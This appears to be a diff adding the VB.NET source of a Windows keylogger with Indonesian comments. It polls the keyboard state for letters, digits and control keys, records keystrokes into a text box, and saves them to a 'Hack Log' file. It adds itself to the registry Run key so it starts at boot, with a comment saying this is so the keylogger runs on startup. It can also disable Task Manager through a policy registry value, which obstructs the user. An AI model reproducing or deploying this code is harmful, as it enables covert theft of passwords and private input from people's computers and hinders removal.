@@ -1,0 +1,268 @@
+Imports System.IO
+Public Class Form1
+
+    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
+    Private Sub Timer1_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        Dim vk_1 As Boolean
+        Dim vk_2 As Boolean
+        Dim vk_3 As Boolean
+        Dim vk_4 As Boolean
+        Dim vk_5 As Boolean
+        Dim vk_6 As Boolean
+        Dim vk_7 As Boolean
+        Dim vk_8 As Boolean
+        Dim vk_9 As Boolean
+        Dim vk_10 As Boolean
+        Dim vk_11 As Boolean
+        Dim vk_12 As Boolean
+        Dim vk_13 As Boolean
+        Dim vk_14 As Boolean
+        Dim vk_15 As Boolean
+        Dim vk_16 As Boolean
+        Dim vk_17 As Boolean
+        Dim vk_18 As Boolean
+        Dim vk_19 As Boolean
+        Dim vk_20 As Boolean
+        Dim vk_21 As Boolean
+        Dim vk_22 As Boolean
+        Dim vk_23 As Boolean
+        Dim vk_24 As Boolean
+        Dim vk_25 As Boolean
+        Dim vk_26 As Boolean
+        Dim vk_27 As Boolean
+        Dim vk_28 As Boolean
+        Dim vk_29 As Boolean
+        Dim vk_30 As Boolean
+        Dim vk_31 As Boolean
+        Dim vk_32 As Boolean
+        Dim vk_33 As Boolean
+        Dim vk_34 As Boolean
+        Dim vk_35 As Boolean
+        Dim vk_36 As Boolean
+        Dim vk_37 As Boolean
+        Dim vk_38 As Boolean
+        Dim vk_39 As Boolean
+        Dim vk_40 As Boolean
+        Dim vk_41 As Boolean
+        Dim vk_42 As Boolean
+        Dim vk_43 As Boolean
+        Dim vk_44 As Boolean
+        Dim vk_45 As Boolean
+        Dim vk_46 As Boolean
+        Dim vk_47 As Boolean
+
+
+        'Abjad'
+        vk_1 = GetAsyncKeyState(Keys.A)
+        vk_2 = GetAsyncKeyState(Keys.B)
+        vk_3 = GetAsyncKeyState(Keys.C)
+        vk_4 = GetAsyncKeyState(Keys.D)
+        vk_5 = GetAsyncKeyState(Keys.E)
+        vk_6 = GetAsyncKeyState(Keys.F)
+        vk_7 = GetAsyncKeyState(Keys.G)
+        vk_8 = GetAsyncKeyState(Keys.H)
+        vk_9 = GetAsyncKeyState(Keys.I)
+        vk_10 = GetAsyncKeyState(Keys.J)
+        vk_11 = GetAsyncKeyState(Keys.K)
+        vk_12 = GetAsyncKeyState(Keys.L)
+        vk_13 = GetAsyncKeyState(Keys.M)
+        vk_14 = GetAsyncKeyState(Keys.N)
+        vk_15 = GetAsyncKeyState(Keys.O)
+        vk_16 = GetAsyncKeyState(Keys.P)
+        vk_17 = GetAsyncKeyState(Keys.Q)
+        vk_18 = GetAsyncKeyState(Keys.R)
+        vk_19 = GetAsyncKeyState(Keys.S)
+        vk_20 = GetAsyncKeyState(Keys.T)
+        vk_21 = GetAsyncKeyState(Keys.U)
+        vk_22 = GetAsyncKeyState(Keys.V)
+        vk_23 = GetAsyncKeyState(Keys.W)
+        vk_24 = GetAsyncKeyState(Keys.X)
+        vk_25 = GetAsyncKeyState(Keys.Y)
+        vk_26 = GetAsyncKeyState(Keys.Z)
+        'Tombol Kontrol'
+        vk_27 = GetAsyncKeyState(Keys.Enter)
+        vk_28 = GetAsyncKeyState(Keys.Space)
+        vk_29 = GetAsyncKeyState(Keys.Back)
+        vk_30 = GetAsyncKeyState(Keys.CapsLock)
+        'Tombol Numerik'
+        vk_31 = GetAsyncKeyState(48)
+        vk_32 = GetAsyncKeyState(49)
+        vk_33 = GetAsyncKeyState(50)
+        vk_34 = GetAsyncKeyState(51)
+        vk_35 = GetAsyncKeyState(52)
+        vk_36 = GetAsyncKeyState(53)
+        vk_37 = GetAsyncKeyState(54)
+        vk_38 = GetAsyncKeyState(55)
+        vk_39 = GetAsyncKeyState(56)
+        vk_40 = GetAsyncKeyState(57)
+        'Tombol Kontrol Baru'
+        vk_41 = GetAsyncKeyState(160)
+        vk_42 = GetAsyncKeyState(161)
+        vk_43 = GetAsyncKeyState(46)
+        vk_44 = GetAsyncKeyState(162)
+        vk_45 = GetAsyncKeyState(163)
+        vk_46 = GetAsyncKeyState(164)
+        vk_47 = GetAsyncKeyState(165)
+        'Tanda Baca'
+
+
+
+        If vk_1 = True Then
+            RichTextBox1.SelectedText = "a"
+        ElseIf vk_2 = True Then
+            RichTextBox1.SelectedText = "b"
+        ElseIf vk_3 = True Then
+            RichTextBox1.SelectedText = "c"
+        ElseIf vk_4 = True Then
+            RichTextBox1.SelectedText = "d"
+        ElseIf vk_5 = True Then
+            RichTextBox1.SelectedText = "e"
+        ElseIf vk_6 = True Then
+            RichTextBox1.SelectedText = "f"
+        ElseIf vk_7 = True Then
+            RichTextBox1.SelectedText = "g"
+        ElseIf vk_8 = True Then
+            RichTextBox1.SelectedText = "h"
+        ElseIf vk_9 = True Then
+            RichTextBox1.SelectedText = "i"
+        ElseIf vk_10 = True Then
+            RichTextBox1.SelectedText = "j"
+        ElseIf vk_11 = True Then
+            RichTextBox1.SelectedText = "k"
+        ElseIf vk_12 = True Then
+            RichTextBox1.SelectedText = "l"
+        ElseIf vk_13 = True Then
+            RichTextBox1.SelectedText = "m"
+        ElseIf vk_14 = True Then
+            RichTextBox1.SelectedText = "n"
+        ElseIf vk_15 = True Then
+            RichTextBox1.SelectedText = "o"
+        ElseIf vk_16 = True Then
+            RichTextBox1.SelectedText = "p"
+        ElseIf vk_17 = True Then
+            RichTextBox1.SelectedText = "q"
+        ElseIf vk_18 = True Then
+            RichTextBox1.SelectedText = "r"
+        ElseIf vk_19 = True Then
+            RichTextBox1.SelectedText = "s"
+        ElseIf vk_20 = True Then
+            RichTextBox1.SelectedText = "t"
+        ElseIf vk_21 = True Then
+            RichTextBox1.SelectedText = "u"
+        ElseIf vk_22 = True Then
+            RichTextBox1.SelectedText = "v"
+        ElseIf vk_23 = True Then
+            RichTextBox1.SelectedText = "w"
+        ElseIf vk_24 = True Then
+            RichTextBox1.SelectedText = "x"
+        ElseIf vk_25 = True Then
+            RichTextBox1.SelectedText = "y"
+        ElseIf vk_26 = True Then
+            RichTextBox1.SelectedText = "z"
+        ElseIf vk_27 = True Then
+            RichTextBox1.SelectedText = "[Enter]"
+        ElseIf vk_28 = True Then
+            RichTextBox1.SelectedText = "[Space]"
+        ElseIf vk_29 = True Then
+            RichTextBox1.SelectedText = "[Backspace]"
+        ElseIf vk_30 = True Then
+            RichTextBox1.SelectedText = "[CapsLock!!]"
+        ElseIf vk_31 = True Then
+            RichTextBox1.SelectedText = "0"
+        ElseIf vk_32 = True Then
+            RichTextBox1.SelectedText = "1"
+        ElseIf vk_33 = True Then
+            RichTextBox1.SelectedText = "2"
+        ElseIf vk_34 = True Then
+            RichTextBox1.SelectedText = "3"
+        ElseIf vk_35 = True Then
+            RichTextBox1.SelectedText = "4"
+        ElseIf vk_36 = True Then
+            RichTextBox1.SelectedText = "5"
+        ElseIf vk_37 = True Then
+            RichTextBox1.SelectedText = "6"
+        ElseIf vk_38 = True Then
+            RichTextBox1.SelectedText = "7"
+        ElseIf vk_39 = True Then
+            RichTextBox1.SelectedText = "8"
+        ElseIf vk_40 = True Then
+            RichTextBox1.SelectedText = "9"
+        ElseIf vk_43 = True Then
+            RichTextBox1.SelectedText = "[Delete]"
+        ElseIf vk_44 = True Or vk_45 = True Then
+            RichTextBox1.SelectedText = "[Ctrl]"
+        ElseIf vk_46 = True Or vk_47 = True Then
+            RichTextBox1.SelectedText = "[alt]"
+        End If
+    End Sub
+
+    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        Timer1.Stop()
+    End Sub
+    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        Timer1.Start()
+        'Me.Hide()'
+    End Sub
+
+    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        Dim varStart As Microsoft.Win32.RegistryKey
+        varStart = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+
+        If check1.Checked = True Then
+            varStart.SetValue(Application.ProductName, Application.ExecutablePath)
+            MsgBox("Program autorun saat pc di hidupkan", MsgBoxStyle.Information, "Service Gass")
+            Timer1.Start() 'ini agar ketika hidup langsung jalan keyloggernya'
+        Else
+
+            MsgBox("Matikan service ?", MsgBoxStyle.YesNo, "Service")
+            If DialogResult.Yes Then
+                varStart.DeleteValue(Application.ProductName)
+                'Kalo uncehk, service mati tapi key tetep jalan'
+            End If
+
+        End If
+    End Sub
+
+    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        Me.Close()
+    End Sub
+
+    Dim RegKey As Object
+    Private Sub CheckBox1_CheckedChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        If Check2.Checked Then
+            RegKey = CreateObject("WScript.Shell")
+            RegKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
+        Else
+            RegKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
+        End If
+    End Sub
+
+    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        saveDialog.ShowDialog()
+        saveDialog.Title = "Hack Log"
+        'saveDialog.InitialDirectory'
+        Dim loc As String
+        loc = saveDialog.FileName
+
+        My.Computer.FileSystem.WriteAllText(loc & ".txt", "" & RichTextBox1.Text, True)
+    End Sub
+
+    Private Sub jam_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        waktu.Text = TimeOfDay
+        'If alarm.Text = waktu.Text Then
+        ' MsgBox("Awokwaow")
+        'End If
+
+        If alarm.Text = jam.Interval Then
+
+        End If
+    End Sub
+
+    Private Sub gas_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        sett.Text = alarm.Text
+    End Sub
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        jam.Start()
+    End Sub
+End Class
